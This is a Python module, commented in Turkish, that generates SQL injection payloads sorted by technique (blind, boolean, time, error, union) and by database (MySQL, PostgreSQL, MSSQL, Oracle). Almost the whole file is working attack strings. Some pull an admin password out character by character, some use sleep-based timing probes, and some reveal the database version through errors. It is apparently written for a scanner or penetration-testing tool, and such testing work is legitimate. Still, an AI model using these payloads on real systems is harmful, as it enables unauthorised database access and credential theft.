"""
SQL Injection payload üreteci modülü.
Bu modül, farklı türlerde SQL injection payloadları üretir.
"""

from dataclasses import dataclass
from typing import List, Optional
from enum import Enum

class PayloadType(Enum):
    """Payload türleri."""
    BOOLEAN = "boolean"
    TIME = "time"
    ERROR = "error"
    UNION = "union"
    BLIND = "blind"

@dataclass
class Payload:
    """SQL Injection payload sınıfı."""
    value: str
    type: PayloadType
    description: str
    dbms: Optional[str] = None

class PayloadGenerator:
    """SQL Injection payload üreteci."""
    
    @staticmethod
    def get_blind_payloads() -> List[Payload]:
        """
        Blind SQL injection payloadları üretir.
        
        Returns:
            Payload listesi
        """
        payloads = []
        
        # Koşullu subquery payloadları
        payloads.extend([
            Payload(
                value="' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1 --",
                type=PayloadType.BLIND,
                description="Koşullu subquery ile boolean-blind test",
                dbms="generic"
            ),
            Payload(
                value="' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 1/0 END FROM users LIMIT 1)=1 --",
                type=PayloadType.BLIND,
                description="Kullanıcı varlığı kontrolü",
                dbms="generic"
            )
        ])
        
        # Bit-by-bit veri çıkarma payloadları
        payloads.extend([
            Payload(
                value="' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>90 --",
                type=PayloadType.BLIND,
                description="Bit-by-bit parola karakteri çıkarma",
                dbms="generic"
            ),
            Payload(
                value="' AND LENGTH((SELECT password FROM users WHERE username='admin'))>8 --",
                type=PayloadType.BLIND,
                description="Parola uzunluğu kontrolü",
                dbms="generic"
            )
        ])
        
        # DBMS spesifik payloadlar - MySQL
        payloads.extend([
            Payload(
                value="' AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM users ORDER BY id LIMIT 1),1,1))>90 --",
                type=PayloadType.BLIND,
                description="MySQL bit-by-bit veri çıkarma",
                dbms="mysql"
            ),
            Payload(
                value="' AND IF(1=1,sleep(0),1) --",
                type=PayloadType.BLIND,
                description="MySQL koşullu time-based blind test",
                dbms="mysql"
            )
        ])
        
        # DBMS spesifik payloadlar - PostgreSQL
        payloads.extend([
            Payload(
                value="' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(5) END) --",
                type=PayloadType.BLIND,
                description="PostgreSQL koşullu time-based blind test",
                dbms="postgresql"
            ),
            Payload(
                value="' AND (SELECT CASE WHEN (LENGTH(current_database())>1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --",
                type=PayloadType.BLIND,
                description="PostgreSQL veritabanı adı uzunluk kontrolü",
                dbms="postgresql"
            )
        ])
        
        # DBMS spesifik payloadlar - MSSQL
        payloads.extend([
            Payload(
                value="' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END FROM sysusers WHERE name='sa')=1 --",
                type=PayloadType.BLIND,
                description="MSSQL kullanıcı varlığı kontrolü",
                dbms="mssql"
            ),
            Payload(
                value="' IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>90) WAITFOR DELAY '0:0:5' --",
                type=PayloadType.BLIND,
                description="MSSQL time-based bit-by-bit veri çıkarma",
                dbms="mssql"
            )
        ])
        
        # DBMS spesifik payloadlar - Oracle
        payloads.extend([
            Payload(
                value="' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL --",
                type=PayloadType.BLIND,
                description="Oracle error-based blind test",
                dbms="oracle"
            ),
            Payload(
                value="' AND (SELECT CASE WHEN SUBSTR(banner,1,1)>'X' THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) ELSE NULL END FROM v$version WHERE ROWNUM=1) IS NULL --",
                type=PayloadType.BLIND,
                description="Oracle time-based bit-by-bit versiyon çıkarma",
                dbms="oracle"
            )
        ])
        
        return payloads
    
    @staticmethod
    def get_boolean_payloads() -> List[Payload]:
        """Boolean-based SQL injection payloadları üretir."""
        payloads = [
            Payload(
                value="' OR '1'='1",
                type=PayloadType.BOOLEAN,
                description="Basic boolean test"
            ),
            Payload(
                value="' OR 1=1 --",
                type=PayloadType.BOOLEAN,
                description="Basic boolean test with comment"
            )
        ]
        return payloads
    
    @staticmethod
    def get_time_payloads() -> List[Payload]:
        """Time-based SQL injection payloadları üretir."""
        payloads = [
            Payload(
                value="; WAITFOR DELAY '0:0:5' --",
                type=PayloadType.TIME,
                description="MSSQL time delay",
                dbms="mssql"
            ),
            Payload(
                value="; SELECT SLEEP(5) --",
                type=PayloadType.TIME,
                description="MySQL time delay",
                dbms="mysql"
            )
        ]
        return payloads
    
    @staticmethod
    def get_error_payloads() -> List[Payload]:
        """Error-based SQL injection payloadları üretir."""
        payloads = [
            Payload(
                value="' AND 1=CONVERT(int,@@version) --",
                type=PayloadType.ERROR,
                description="MSSQL error-based version",
                dbms="mssql"
            ),
            Payload(
                value="' AND extractvalue(rand(),concat(0x3a,version())) --",
                type=PayloadType.ERROR,
                description="MySQL error-based version",
                dbms="mysql"
            )
        ]
        return payloads
    
    @staticmethod
    def get_union_payloads() -> List[Payload]:
        """Union-based SQL injection payloadları üretir."""
        payloads = [
            Payload(
                value="' UNION SELECT NULL--",
                type=PayloadType.UNION,
                description="Basic UNION test single column"
            ),
            Payload(
                value="' UNION SELECT NULL,NULL--",
                type=PayloadType.UNION,
                description="Basic UNION test two columns"
            )
        ]
        return payloads
    
    @staticmethod
    def get_all_payloads() -> List[Payload]:
        """Tüm SQL injection payloadlarını üretir."""
        payloads = []
        payloads.extend(PayloadGenerator.get_blind_payloads())
        payloads.extend(PayloadGenerator.get_boolean_payloads())
        payloads.extend(PayloadGenerator.get_time_payloads())
        payloads.extend(PayloadGenerator.get_error_payloads())
        payloads.extend(PayloadGenerator.get_union_payloads())
        return payloads 